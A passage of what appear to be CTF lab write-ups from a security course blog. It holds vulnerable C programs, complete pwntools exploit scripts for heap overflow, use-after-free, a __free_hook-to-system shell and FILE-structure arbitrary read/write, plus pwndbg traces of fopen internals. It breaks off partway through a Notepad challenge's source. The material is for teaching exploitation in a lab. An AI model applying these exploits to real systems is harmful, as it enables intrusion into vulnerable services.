printf(\u0026#34;size\\n\u0026gt; \u0026#34;); scanf(\u0026#34;%hu\u0026#34;, \u0026amp;size); if (size \u0026gt;= 0x500) printf(\u0026#34;no, no ...\u0026#34;), exit(1); return size; } void add_user() { short int idx; idx = get_idx(); users[idx] = malloc(sizeof(*users[idx])); printf(\u0026#34;username\\n\u0026gt; \u0026#34;); read(0, users[idx]-\u0026gt;name, 0x10); printf(\u0026#34;password\\n\u0026gt; \u0026#34;); read(0, users[idx]-\u0026gt;password, 0x10); users[idx]-\u0026gt;data = NULL; printf(\u0026#34;success!\\n\u0026#34;); } void edit_data() { short int idx; short int size; idx = get_idx(); size = get_size(); if (users[idx]-\u0026gt;data == NULL) users[idx]-\u0026gt;data = malloc(size); read(0, users[idx]-\u0026gt;data, size); printf(\u0026#34;success!\\n\u0026#34;); } void del_user() { short int idx; idx = get_idx(); free(users[idx]-\u0026gt;data); free(users[idx]); printf(\u0026#34;success!\\n\u0026#34;); } void show_users() { for (int i = 0; i \u0026lt; 8; i++) { if (users[i] == NULL || users[i]-\u0026gt;data == NULL) continue; printf(\u0026#34;[%d] %s\\ndata: %s\\n\u0026#34;, i, users[i]-\u0026gt;name, (char *)users[i]-\u0026gt;data); } } void add_admin() { users[0] = malloc(sizeof(*users[0])); strcpy(users[0]-\u0026gt;name, \u0026#34;admin\u0026#34;); strcpy(users[0]-\u0026gt;password, FLAG1); users[0]-\u0026gt;data = NULL; } int main() { char opt[2]; int power = 20; setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); printf(\u0026#34;**** User Management System ****\\n\u0026#34;); add_admin(); while (power) { power--; printf(\u0026#34;1. add_user\\n\u0026#34; \u0026#34;2. edit_data\\n\u0026#34; \u0026#34;3. del_user\\n\u0026#34; \u0026#34;4. show_users\\n\u0026#34; \u0026#34;5. bye\\n\u0026#34; \u0026#34;\u0026gt; \u0026#34;); read(0, opt, 2); switch (opt[0]) { case \u0026#39;1\u0026#39;: add_user(); break; case \u0026#39;2\u0026#39;: edit_data(); break; case \u0026#39;3\u0026#39;: del_user(); break; case \u0026#39;4\u0026#39;: show_users(); break; case \u0026#39;5\u0026#39;: exit(0); } } printf(\u0026#34;No... no power..., b..ye...\\n\u0026#34;); return 0; } :::\nSomething wrong # Heap overflow Used after free(UAF) Note that, flag 1 is admin password, flag 2 is at /home/chal/ Exploit # Hard solution - leak heap base address + heap overflow # If we can use heap overflow to overlap the user k\u0026rsquo;s *data, then we can let it point to admin\u0026rsquo;s password and use show_users() to print it out\nleak admin password address It\u0026rsquo;s very straight forward, if we delete two user, user 2 first and then user 1, at the same time, the fd of user 1 will point to the data of user 2. Then we can use show_user() to leak the address and try to find admin_pass_addr by minus offset\nedit_data(0, 0x8, b\u0026#39;a\u0026#39;) # Must add this line to use heap overflow add_user(1, b\u0026#39;a\u0026#39;*8, b\u0026#39;aaaa\u0026#39;) edit_data(1, 0x20, b\u0026#39;a\u0026#39;) add_user(2, b\u0026#39;b\u0026#39;*8, b\u0026#39;bbbb\u0026#39;) del_user(2) del_user(1) show_user() r.recvuntil(b\u0026#39;[1] \u0026#39;) r.recvuntil(b\u0026#39;data: \u0026#39;) admin_pass_addr = u64(r.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) - 0xa0 print(hex(admin_pass_addr)) Get the memory back from tcache\nadd_user(1, b\u0026#39;a\u0026#39;*8, b\u0026#39;aaaa\u0026#39;) edit_data(1, 0x20, b\u0026#39;a\u0026#39;) Construct fake chunk that the data pointer will point to the admin_pass_addr\nfake_chunk = flat( b\u0026#39;a\u0026#39;*8, b\u0026#39;a\u0026#39;*8, b\u0026#39;a\u0026#39;*8, 0x31, b\u0026#39;a\u0026#39;*8, b\u0026#39;a\u0026#39;*8, b\u0026#39;a\u0026#39;*8, b\u0026#39;a\u0026#39;*8, admin_pass_addr, ) edit_data(0, 0x48, fake_chunk) show_user() Then we got flag 1!!! Easy solution # Try to let the admin user be the data of other user, then we can use show_user function to print it out\nadd_user(1, b\u0026#39;a\u0026#39;*8, b\u0026#39;aaaa\u0026#39;) del_user(0) edit_data(1, 0x20, b\u0026#39;b\u0026#39;*16) show_user() First, we add user 1 Then we delete user 0(admin), so that it\u0026rsquo;ll be put into tcache(0x30) When we use edit_data function, it\u0026rsquo;ll get a memory space from sub-bin of tcache be user1\u0026rsquo;s data, which is what we delete. In addition, in order to print the data section out, must change the NULL byte to garbage Then we got flag 1!!! :::spoiler Whole exploit\nfrom pwn import * r = process(\u0026#39;./chal\u0026#39;) # r = remote(\u0026#39;edu-ctf.zoolab.org\u0026#39;, 10008) context.arch = \u0026#39;amd64\u0026#39; def add_user(idx, user_name, user_passwd): r.sendafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) r.sendlineafter(b\u0026#39;index\\n\u0026gt; \u0026#39;, str(idx)) r.sendafter(b\u0026#39;username\\n\u0026gt; \u0026#39;, user_name) r.sendafter(b\u0026#39;password\\n\u0026gt; \u0026#39;, user_passwd) def edit_data(idx, note_size, message): r.sendafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;2\u0026#34;) r.sendlineafter(b\u0026#39;index\\n\u0026gt; \u0026#39;, str(idx)) r.sendlineafter(b\u0026#39;size\\n\u0026gt; \u0026#39;, str(note_size)) r.send(message) def del_user(idx): r.sendafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;3\u0026#34;) r.sendlineafter(b\u0026#39;index\\n\u0026gt; \u0026#39;, str(idx)) def show_user(): r.sendafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;4\u0026#34;) \u0026#39;\u0026#39;\u0026#39;------------------ Hard solution ------------------\u0026#39;\u0026#39;\u0026#39; edit_data(0, 0x8, b\u0026#39;a\u0026#39;) add_user(1, b\u0026#39;a\u0026#39;*8, b\u0026#39;aaaa\u0026#39;) edit_data(1, 0x20, b\u0026#39;a\u0026#39;) add_user(2, b\u0026#39;b\u0026#39;*8, b\u0026#39;bbbb\u0026#39;) del_user(2) del_user(1) show_user() r.recvuntil(b\u0026#39;[1] \u0026#39;) admin_pass_addr = u64(r.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) - 0x70 print(hex(admin_pass_addr)) add_user(1, b\u0026#39;a\u0026#39;*8, b\u0026#39;aaaa\u0026#39;) fake_chunk = flat( b\u0026#39;a\u0026#39;*8, b\u0026#39;a\u0026#39;*8, b\u0026#39;a\u0026#39;*8, 0x31, b\u0026#39;a\u0026#39;*8, b\u0026#39;a\u0026#39;*8, b\u0026#39;a\u0026#39;*8, b\u0026#39;a\u0026#39;*8, admin_pass_addr, ) edit_data(1, 0x20, b\u0026#39;a\u0026#39;) edit_data(0, 0x48, fake_chunk) show_user() \u0026#39;\u0026#39;\u0026#39;------------------ Easy solution ------------------\u0026#39;\u0026#39;\u0026#39; add_user(1, b\u0026#39;a\u0026#39;*8, b\u0026#39;aaaa\u0026#39;) del_user(0) edit_data(1, 0x20, b\u0026#39;b\u0026#39;*16) show_user() r.interactive() :::\n"},{"id":388,"href":"/security/course/ntu-cs/pwn/simple-pwn-0x20lab---babyums---flag-2/","title":"Simple PWN 0x20(Lab - `babyums` - flag 2)","section":"Securities","content":" Simple PWN 0x20(Lab - babyums - flag 2) # tags: CTF PWN eductf # Version: Ubuntu 20.04\nOriginal Code # Simple PWN 0x19(Lab - babyums - flag 1)\nExploit # Very similar in this article: 0x18(Lab - babynote) :::spoiler code\nfrom pwn import * # r = process(\u0026#39;./chal\u0026#39;) r = remote(\u0026#39;edu-ctf.zoolab.org\u0026#39;, 10008) context.arch = \u0026#39;amd64\u0026#39; def add_user(idx, user_name, user_passwd): r.sendafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) r.sendlineafter(b\u0026#39;index\\n\u0026gt; \u0026#39;, str(idx)) r.sendafter(b\u0026#39;username\\n\u0026gt; \u0026#39;, user_name) r.sendafter(b\u0026#39;password\\n\u0026gt; \u0026#39;, user_passwd) def edit_data(idx, note_size, message): r.sendafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;2\u0026#34;) r.sendlineafter(b\u0026#39;index\\n\u0026gt; \u0026#39;, str(idx)) r.sendlineafter(b\u0026#39;size\\n\u0026gt; \u0026#39;, str(note_size)) r.send(message) def del_user(idx): r.sendafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;3\u0026#34;) r.sendlineafter(b\u0026#39;index\\n\u0026gt; \u0026#39;, str(idx)) def show_user(): r.sendafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;4\u0026#34;) \u0026#39;\u0026#39;\u0026#39;------------------ Construct heap memory ------------------\u0026#39;\u0026#39;\u0026#39; add_user(0, b\u0026#39;a\u0026#39;*8, b\u0026#39;aaaa\u0026#39;) edit_data(0, 0x418, b\u0026#39;a\u0026#39;) add_user(1, b\u0026#39;b\u0026#39;*8, b\u0026#39;bbbb\u0026#39;) edit_data(1, 0x18, b\u0026#39;b\u0026#39;) add_user(2, b\u0026#39;c\u0026#39;*8, b\u0026#39;cccc\u0026#39;) \u0026#39;\u0026#39;\u0026#39;------------------ Leak libc address ------------------\u0026#39;\u0026#39;\u0026#39; del_user(0) show_user() r.recvuntil(b\u0026#39;data:\u0026#39;) libc = (u64(r.recv(8)) \u0026gt;\u0026gt; 8) - 0x1ecbe0 - 0xa000000000000 info(f\u0026#34;libc address: {hex(libc)}\u0026#34;) free_hook_addr = libc + 0x1eee48 info(f\u0026#34;__free_hook address: {hex(free_hook_addr)}\u0026#34;) libc_sys_addr = libc + 0x52290 info(f\u0026#34;__libc_system address: {hex(libc_sys_addr)}\u0026#34;) \u0026#39;\u0026#39;\u0026#39;------------------ Construct fake chunk ------------------\u0026#39;\u0026#39;\u0026#39; data = b\u0026#39;/bin/sh\\x00\u0026#39;.ljust(0x10, b\u0026#39;b\u0026#39;) fake_chunk = flat( 0, 0x31, b\u0026#39;cccccccc\u0026#39;, b\u0026#39;cccccccc\u0026#39;, b\u0026#39;cccccccc\u0026#39;, b\u0026#39;cccccccc\u0026#39;, free_hook_addr ) edit_data(1, 0x48, data + fake_chunk) edit_data(2, 0x8, p64(libc_sys_addr)) del_user(1) r.interactive() :::\n"},{"id":389,"href":"/security/course/ntu-cs/pwn/simple-pwn-0x21fopen-fread-fwrite-fclose/","title":"Simple PWN 0x21(fopen, fread, fwrite, fclose)","section":"Securities","content":" Simple PWN 0x21(fopen, fread, fwrite, fclose) # tags: CTF PWN eductf # Version: Ubuntu 20.04\nOriginal Code # :::spoiler fopen\n#include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; int main() { FILE *fp; fp = fopen(\u0026#34;./test\u0026#34;, \u0026#34;r\u0026#34;); fclose(fp); return 0; } :::\n:::spoiler fread\n#include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; int main() { FILE *fp; char buf[0x10]; fp = fopen(\u0026#34;./test\u0026#34;, \u0026#34;r\u0026#34;); fread(buf, 0x1, 0x10, fp); fclose(fp); return 0; } :::\n:::spoiler fwrite\n#include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; int main() { FILE *fp; char buf[0x10] = \u0026#34;TEST!!\u0026#34;; fp = fopen(\u0026#34;./test_write\u0026#34;, \u0026#34;r\u0026#34;); fread(buf, 0x1, 0x10, fp); fclose(fp); return 0; } :::\n:::spoiler fclose\n:::\nAnalyze # fopen # Flow chart fopen - main() ... \u0026lt;main+26\u0026gt; call fopen@plt \u0026lt;fopen@plt\u0026gt; pwndbg\u0026gt; si malloc - iofopen.c \u0026lt;__fopen_internal+26\u0026gt; call malloc@plt\t\u0026lt;malloc@plt\u0026gt; # Size: 0x1d8 pwndbg\u0026gt; heap ... Allocated chunk | PREV_INUSE Addr: 0x555555559290 Size: 0x1e1 ... :::spoiler new_f pwndbg\u0026gt; p *new_f $2 = { fp = { file = { _flags = 0, _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x0, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x0, _fileno = 0, _flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0 \u0026#39;\\000\u0026#39;, _shortbuf = \u0026#34;\u0026#34;, _lock = 0x0, _offset = 0, _codecvt = 0x0, _wide_data = 0x0, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = 0, _unused2 = \u0026#39;\\000\u0026#39; \u0026lt;repeats 19 times\u0026gt; }, vtable = 0x0 }, lock = { lock = 0, cnt = 0, owner = 0x0 }, wd = { _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x0, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _IO_state = { __count = 0, __value = { __wch = 0, __wchb = \u0026#34;\\000\\000\\000\u0026#34; } }, _IO_last_state = { __count = 0, __value = { __wch = 0, __wchb = \u0026#34;\\000\\000\\000\u0026#34; } }, _codecvt = { __cd_in = { step = 0x0, step_data = { __outbuf = 0x0, __outbufend = 0x0, __flags = 0, __invocation_counter = 0, __internal_use = 0, __statep = 0x0, __state = { __count = 0, __value = { __wch = 0, __wchb = \u0026#34;\\000\\000\\000\u0026#34; } } } }, __cd_out = { step = 0x0, step_data = { __outbuf = 0x0, __outbufend = 0x0, __flags = 0, __invocation_counter = 0, __internal_use = 0, __statep = 0x0, __state = { __count = 0, __value = { __wch = 0, __wchb = \u0026#34;\\000\\000\\000\u0026#34; } } } } }, _shortbuf = L\u0026#34;\u0026#34;, _wide_vtable = 0x0 } } ::: Initialize - iofopen.c ... _IO_no_init (\u0026amp;new_f-\u0026gt;fp.file, 0, 0, \u0026amp;new_f-\u0026gt;wd, \u0026amp;_IO_wfile_jumps); _IO_JUMPS (\u0026amp;new_f-\u0026gt;fp) = \u0026amp;_IO_file_jumps; _IO_new_file_init_internal (\u0026amp;new_f-\u0026gt;fp); ... :::spoiler _IO_file_jumps pwndbg\u0026gt; p _IO_file_jumps $3 = { __dummy = 0, __dummy2 = 0, __finish = 0x7ffff7e87ff0 \u0026lt;_IO_new_file_finish\u0026gt;, __overflow = 0x7ffff7e88a00 \u0026lt;_IO_new_file_overflow\u0026gt;, __underflow = 0x7ffff7e886b0 \u0026lt;_IO_new_file_underflow\u0026gt;, __uflow = 0x7ffff7e899c0 \u0026lt;__GI__IO_default_uflow\u0026gt;, __pbackfail = 0x7ffff7e8ad40 \u0026lt;__GI__IO_default_pbackfail\u0026gt;, __xsputn = 0x7ffff7e87be0 \u0026lt;_IO_new_file_xsputn\u0026gt;, __xsgetn = 0x7ffff7e877a0 \u0026lt;__GI__IO_file_xsgetn\u0026gt;, __seekoff = 0x7ffff7e87010 \u0026lt;_IO_new_file_seekoff\u0026gt;, __seekpos = 0x7ffff7e89d60 \u0026lt;_IO_default_seekpos\u0026gt;, __setbuf = 0x7ffff7e868f0 \u0026lt;_IO_new_file_setbuf\u0026gt;, __sync = 0x7ffff7e86780 \u0026lt;_IO_new_file_sync\u0026gt;, __doallocate = 0x7ffff7e7b3b0 \u0026lt;__GI__IO_file_doallocate\u0026gt;, __read = 0x7ffff7e87bb0 \u0026lt;__GI__IO_file_read\u0026gt;, __write = 0x7ffff7e875f0 \u0026lt;_IO_new_file_write\u0026gt;, __seek = 0x7ffff7e86d70 \u0026lt;__GI__IO_file_seek\u0026gt;, __close = 0x7ffff7e868e0 \u0026lt;__GI__IO_file_close\u0026gt;, __stat = 0x7ffff7e875d0 \u0026lt;__GI__IO_file_stat\u0026gt;, __showmanyc = 0x7ffff7e8aed0 \u0026lt;_IO_default_showmanyc\u0026gt;, __imbue = 0x7ffff7e8aee0 \u0026lt;_IO_default_imbue\u0026gt; } ::: parse mode in fileops.c - _IO_new_file_fopen() __GI__IO_file_fopen - iofopen.c ... \u0026lt;__fopen_internal+120\u0026gt; call __GI__IO_file_fopen\t\u0026lt;__GI__IO_file_fopen\u0026gt; rdi: 0x5555555592a0 ◂— 0xfbad248c rsi: 0x555555556006 ◂— 0x747365742f2e /* \u0026#39;./test\u0026#39; */ rdx: 0x555555556004 ◂— 0x747365742f2e0072 /* \u0026#39;r\u0026#39; */ rcx: 0x1 _IO_file_open - fileops.c \u0026lt;__GI__IO_file_fopen+188\u0026gt; call _IO_file_open\t\u0026lt;_IO_file_open\u0026gt; rdi: 0x5555555592a0 ◂— 0xfbad248c rsi: 0x555555556006 ◂— 0x747365742f2e /* \u0026#39;./test\u0026#39; */ rdx: 0x0 rcx: 0x1b6 sys_open - open64.c \u0026lt;_IO_file_open+33\u0026gt; call open64\t\u0026lt;open64\u0026gt;\t# It\u0026#39;ll return file number(fd) file: 0x555555556006 ◂— 0x747365742f2e /* \u0026#39;./test\u0026#39; */ oflag: 0x0 # read only mode vararg: 0x1b6 ... \u0026lt;open64+73\u0026gt; syscall \u0026lt;SYS_openat\u0026gt; fd: 0xffffff9c file: 0x555555556006 ◂— 0x747365742f2e /* \u0026#39;./test\u0026#39; */ oflag: 0x0 vararg: 0x0 Whole work flow :::spoiler work flow \u0026lt;main+26\u0026gt; call fopen@plt\t\u0026lt;fopen@plt\u0026gt; ... \u0026lt;__fopen_internal+26\u0026gt; call malloc@plt\t\u0026lt;malloc@plt\u0026gt; size: 0x1d8 ... \u0026lt;__fopen_internal+81\u0026gt; call _IO_no_init\t\u0026lt;_IO_no_init\u0026gt; ... \u0026lt;__fopen_internal+103\u0026gt; call _IO_new_file_init_internal\t\u0026lt;_IO_new_file_init_internal\u0026gt; rdi: 0x5555555592a0 ◂— 0xfbad0000 ... \u0026lt;_IO_new_file_init_internal+25\u0026gt; call _IO_link_in\t\u0026lt;_IO_link_in\u0026gt; rdi: 0x5555555592a0 ◂— 0xfbad240c rsi: 0xfbad0000 rdx: 0x0 rcx: 0x555555559390 ◂— 0x0 ... \u0026lt;__fopen_internal+120\u0026gt; call __GI__IO_file_fopen\t\u0026lt;__GI__IO_file_fopen\u0026gt; rdi: 0x5555555592a0 ◂— 0xfbad248c rsi: 0x555555556006 ◂— 0x747365742f2e /* \u0026#39;./test\u0026#39; */ rdx: 0x555555556004 ◂— 0x747365742f2e0072 /* \u0026#39;r\u0026#39; */ rcx: 0x1 ... \u0026lt;__GI__IO_file_fopen+188\u0026gt; call _IO_file_open\t\u0026lt;_IO_file_open\u0026gt; rdi: 0x5555555592a0 ◂— 0xfbad248c rsi: 0x555555556006 ◂— 0x747365742f2e /* \u0026#39;./test\u0026#39; */ rdx: 0x0 rcx: 0x1b6 ... \u0026lt;_IO_file_open+33\u0026gt; call open64\t\u0026lt;open64\u0026gt;\t# It\u0026#39;ll return file number(fd) file: 0x555555556006 ◂— 0x747365742f2e /* \u0026#39;./test\u0026#39; */ oflag: 0x0 # read only mode vararg: 0x1b6 ... \u0026lt;open64+73\u0026gt; syscall \u0026lt;SYS_openat\u0026gt; fd: 0xffffff9c file: 0x555555556006 ◂— 0x747365742f2e /* \u0026#39;./test\u0026#39; */ oflag: 0x0 vararg: 0x0 ::: :::spoiler *fp pwndbg\u0026gt; p *fp $4 = { _flags = -72539000, _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x0, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x7ffff7fc45c0 \u0026lt;_IO_2_1_stderr_\u0026gt;, _fileno = 3, _flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0 \u0026#39;\\000\u0026#39;, _shortbuf = \u0026#34;\u0026#34;, _lock = 0x555555559380, _offset = -1, _codecvt = 0x0, _wide_data = 0x555555559390, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = 0, _unused2 = \u0026#39;\\000\u0026#39; \u0026lt;repeats 19 times\u0026gt; } ::: fread # Flow chart fwrite # Flow chart fclose # Flow chart "},{"id":390,"href":"/security/course/ntu-cs/pwn/simple-pwn-0x22lab---aar/","title":"Simple PWN 0x22(Lab - `AAR`)","section":"Securities","content":" Simple PWN 0x22(Lab - AAR) # tags: CTF PWN eductf # Version: Ubuntu 20.04\nOriginal Code # :::spoiler Original Code\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; char flag[0x10] = \u0026#34;FLAG{TEST}\\n\u0026#34;; int main() { FILE *fp; char *buf; buf = malloc(0x10); fp = fopen(\u0026#34;/tmp/meow\u0026#34;, \u0026#34;w\u0026#34;); read(0, buf, 0x1000); fwrite(buf, 0x10, 1, fp); return 0; } :::\nExploit - heap overflow + overlap flag # from pwn import * # r = process(\u0026#39;./chal\u0026#39;) r = remote(\u0026#39;edu-ctf.zoolab.org\u0026#39;, 10010) context.arch = \u0026#39;amd64\u0026#39; flag_addr = 0x404050 raw_input() payload = flat( p64(0)*4, p64(0xfbad0800), #_flags p64(0), #_IO_read_ptr p64(flag_addr), #_IO_read_end p64(0), #_IO_read_base p64(flag_addr), #_IO_write_base p64(flag_addr+0x10), #_IO_write_ptr p64(0)*8, #_IO_write_end + _IO_buf_base + _IO_buf_end + _chain p64(0x1) #_fileno ) r.send(payload) r.interactive() "},{"id":391,"href":"/security/course/ntu-cs/pwn/simple-pwn-0x23lab---aaw/","title":"Simple PWN 0x23(Lab - `AAW`)","section":"Securities","content":" Simple PWN 0x23(Lab - AAW) # tags: CTF PWN eductf # Version: Ubuntu 20.04\nOriginal Code # :::spoiler Original Code\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; char flag[0x10] = \u0026#34;FLAG{TEST}\\n\u0026#34;; char owo[] = \u0026#34;OWO!\u0026#34;; int main() { FILE *fp; char *buf; buf = malloc(0x10); fp = fopen(\u0026#34;/tmp/meow\u0026#34;, \u0026#34;r\u0026#34;); read(0, buf, 0x1000); fread(buf, 0x10, 1, fp); if (strcmp(owo, \u0026#34;OWO!\u0026#34;) != 0) write(1, flag, sizeof(flag)); return 0; } :::\nExploit # from pwn import * # r = process(\u0026#39;./chal\u0026#39;) r = remote(\u0026#39;edu-ctf.zoolab.org\u0026#39;, 10009) context.arch = \u0026#39;amd64\u0026#39; owo_addr = 0x404070 raw_input() payload = flat( p64(0)*2, 0, 0x1e1, p64(0xfbad0000), #_flags O p64(0), #_IO_read_ptr O p64(0), #_IO_read_end O p64(0), #_IO_read_base X p64(owo_addr), #_IO_write_base O p64(0), #_IO_write_ptr X p64(0), #_IO_write_end X p64(owo_addr), #_IO_buf_base O p64(owo_addr+0x20), #_IO_buf_end O p64(0)*5, #_chain X p64(0) #_fileno O ) r.send(payload) raw_input() r.sendline(p64(2)*2) r.interactive() "},{"id":392,"href":"/security/course/ntu-cs/pwn/simple-pwn-0x312023-hw---notepad---stage---1/","title":"Simple PWN 0x31(2023 HW - Notepad - Stage - 1)","section":"Securities","content":" Simple PWN 0x31(2023 HW - Notepad - Stage - 1) # Description \u0026amp; Hint # nc 10.113.184.121 10044\nYou should solve the PoW to invoke a new instance. You can use the pow_solver.py script in the released zip to solve the PoW. After you solve the PoW, the service will create a new container and show \u0026gt;you the port. Connect it to play this challenge! The container will be destroy at 5 minutes. So you should debug your exploit in your environment.\nImage Base: ubuntu:22.04 (e4c58958181a)\nTry to get /flag_user.\nFile: Notepad-release_fa266ab516200ef4.zip\nHint: Path Traversal\nSource code # :::spoiler Source Code\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;netinet/in.h\u0026gt; #include \u0026lt;netinet/tcp.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;arpa/inet.h\u0026gt; #include \u0026lt;limits.h\u0026gt; #include \u0026#34;SECCOMP.h\u0026#34; #define USERNAME_LEN 0x10 #define PASSWORD_LEN 0x10 #define CMD_Register 0x1 #define CMD_Login 0x2 #define CMD_GetFolder 0x11 #define CMD_NewNote 0x12 #define CMD_Flag 0x8787 #define RES_Success 0x0 #define RES_Failed 0x1 #define RES_NotFound 0x2 struct sock_filter seccompfilter[]={ BPF_STMT(BPF_LD | BPF_W | BPF_ABS, ArchField), BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 1, 0), BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL), BPF_STMT(BPF_LD | BPF_W | BPF_ABS, SyscallNum), Allow(open), Allow(openat), Allow(lseek), Allow(read), Allow(write), Allow(socket), Allow(connect), Allow(close), Allow(readlink), Allow(getdents), Allow(getrandom), Allow(brk), Allow(rt_sigreturn), Allow(exit), Allow(exit_group), BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL), }; struct sock_fprog filterprog={ .len=sizeof(seccompfilter)/sizeof(struct sock_filter), .filter=seccompfilter }; void apply_seccomp(){ if(prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0)){ perror(\u0026#34;Seccomp Error\u0026#34;); exit(1); } if(prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,\u0026amp;filterprog)==-1){ perror(\u0026#34;Seccomp Error\u0026#34;); exit(1); } return; } struct Command { __uint32_t cmd; u_char token[32]; u_char args[128]; }; struct Response { __uint32_t code; u_char res[256]; }; char *Token; void errorexit(char *msg) { puts(msg); exit(-1); } int connect_backend() { int fd = socket(AF_INET, SOCK_STREAM, 0); struct sockaddr_in info; bzero(\u0026amp;info, sizeof(info)); info.sin_family = PF_INET; info.sin_addr.s_addr = inet_addr(\u0026#34;127.0.0.1\u0026#34;); info.sin_port = htons(8765); if(connect(fd, (struct sockaddr *)\u0026amp;info, sizeof(info))==-1){ return -1; } return fd; } void command_login(int fd, char *username, char *password) { if(strlen(username)\u0026gt;=USERNAME_LEN || strlen(password)\u0026gt;=PASSWORD_LEN){ errorexit(\u0026#34;Username or Password too long.\u0026#34;); return ; } struct Command cmd; memset(\u0026amp;cmd, 0, sizeof(cmd)); cmd.cmd = CMD_Login; strcpy(cmd.args, username); strcpy(\u0026amp;cmd.args[strlen(cmd.args)+1], password); write(fd, \u0026amp;cmd, sizeof(cmd)); struct Response res; memset(\u0026amp;res, 0, sizeof(res)); if(read(fd, \u0026amp;res, sizeof(res))!=sizeof(res)){ errorexit(\u0026#34;Error while recv backend response.\u0026#34;); } if(res.code==RES_Success){ Token = strdup(res.res); puts(\u0026#34;Login Success!\u0026#34;); } else{ Token = 0; puts(\u0026#34;Login Failed!\u0026#34;); } } void command_register(int fd, char *username, char *password) { if(strlen(username)\u0026gt;=USERNAME_LEN || strlen(password)\u0026gt;=PASSWORD_LEN){ puts(\u0026#34;Username or Password too long.\u0026#34;); return ; } struct Command cmd; memset(\u0026amp;cmd, 0, sizeof(cmd)); cmd.cmd = CMD_Register; strcpy(cmd.args, username); strcpy(\u0026amp;cmd.args[strlen(cmd.args)+1], password); write(fd, \u0026amp;cmd, sizeof(cmd)); struct Response res; memset(\u0026amp;res, 0, sizeof(res)); if(read(fd, \u0026amp;res, sizeof(res))!=sizeof(res)){ puts(\u0026#34;Error while recv backend response.\u0026#34;); return ; } if(res.code==RES_Success){ puts(\u0026#34;Register Success!\u0026#34;); } else{ puts(\u0026#34;Register Failed!\u0026#34;); } } void command_newnote(int fd, char *notename, char *content) { if(!Token) { puts(\u0026#34;Please login first.\u0026#34;); return ; } struct Command cmd; memset(\u0026amp;cmd, 0, sizeof(cmd)); struct Response res; memset(\u0026amp;res, 0, sizeof(res)); cmd.cmd = CMD_NewNote; strcpy(cmd.token, Token); strncpy(cmd.args, notename, sizeof(cmd.args)); write(fd, \u0026amp;cmd, sizeof(cmd)); if(read(fd, \u0026amp;res, sizeof(res))!=sizeof(res)){ puts(\u0026#34;Error while recv backend response.\u0026#34;); return ; } if(res.code!=RES_Success){ puts(\u0026#34;Note create failed.\u0026#34;); return ; } //puts(\u0026#34;Backend has created the note file.\u0026#34;); int newfile_fd = open(res.res, O_RDWR); if(newfile_fd\u0026lt;0){ puts(\u0026#34;Note create failed.\u0026#34;); return ; } write(newfile_fd, content, strlen(content)); close(newfile_fd); puts(\u0026#34;Note created!\u0026#34;); } int openfile(int fd, char *notename, off_t offset, int oflag) { if(!Token) { puts(\u0026#34;Please login first.\u0026#34;); return -1; } struct Command cmd; memset(\u0026amp;cmd, 0, sizeof(cmd)); struct Response res; memset(\u0026amp;res, 0, sizeof(res)); cmd.cmd = CMD_GetFolder; strcpy(cmd.token, Token); write(fd, \u0026amp;cmd, sizeof(cmd)); if(read(fd, \u0026amp;res, sizeof(res))!=sizeof(res)){ puts(\u0026#34;Error while recv backend response.\u0026#34;); return -1; } if(res.code!=RES_Success){ puts(\u0026#34;Couldn\u0026#39;t get note storage path.\u0026#34;); return -1; } char path[128]; //strcpy(path, res.res); snprintf(path, sizeof(path), \u0026#34;%s%s.txt\u0026#34;,res.res, notename); //char rpath[128]; //realpath(path, rpath); //puts(rpath); int filefd = open(path, 